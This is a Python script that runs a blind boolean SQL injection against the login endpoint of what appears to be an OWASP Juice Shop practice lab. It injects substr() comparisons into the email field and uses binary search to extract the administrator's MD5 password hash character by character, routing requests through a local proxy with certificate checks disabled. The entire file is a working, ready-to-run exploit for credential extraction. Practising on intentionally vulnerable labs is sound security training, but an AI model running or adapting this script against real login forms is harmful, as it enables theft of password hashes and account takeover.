#! /usr/bin/env python3
# Import required libraries
import requests  # For sending HTTP requests

# Disable SSL certificate verification warnings (for testing only; unsafe for production!)
requests.packages.urllib3.disable_warnings()

# Global counter for number of HTTP requests
request_count = 0

# Target URL for login requests
url = "http://mailtest.evdaez-lab.com:3000/rest/user/login"


# Use a proxy (e.g., Burp Suite) to inspect requests
proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
}


# Base email string with SQL injection point
base_email = "admin@juice-sh.op' AND "

# Data sent in POST request; password is irrelevant due to SQL injection
base_data = {
    "email": "",      # Will be set to our payload
    "password": "anything"  # Any value; not used
}


# Possible characters in an MD5 hash (hexadecimal)
charset = '0123456789abcdef'


# Find the character at a specific position in the password using binary search
# pos: position in password (1-based)
def get_char(pos):
    global request_count
    low, high = 0, 15  # Indices for charset
    
    while low <= high:
        mid = (low + high) // 2
        char = charset[mid]

        # SQL injection: is the character at position >= current char?
        payload = f"{base_email}substr(password,{pos},1)>='{char}' --"
        base_data["email"] = payload
        
        resp = requests.post(url, json=base_data, proxies=proxies, verify=False)
        request_count += 1
        
        if resp.status_code == 200:  # Char is >= this
            low = mid + 1
        else:
            high = mid - 1

    # Confirm the exact character by checking equality
    if high >= 0:
        test_char = charset[high]
        payload = f"{base_email}substr(password,{pos},1)='{test_char}' --"
        base_data["email"] = payload

        resp = requests.post(url, json=base_data, proxies=proxies, verify=False)
        request_count += 1

        if resp.status_code == 200:
            return test_char
        
    return None  # If not found


# Main execution block
if __name__ == "__main__":
    # Step 1: Initialize password list
    pwLen = 32
    password = [''] * pwLen

    # Step 2: Brute-force each character in the password
    for pos in range(1, pwLen + 1):
        char = get_char(pos)

        if char:
            password[pos - 1] = char
            print(f"Position {pos}: {char}, Current: {''.join(password)}")
        else:
            print(f"Failed at position {pos}, stopping.")
            break

    # Step 3: Print the final password hash
    print(f"Final password hash: {''.join(password)}")
    print(f"Total HTTP requests sent: {request_count}")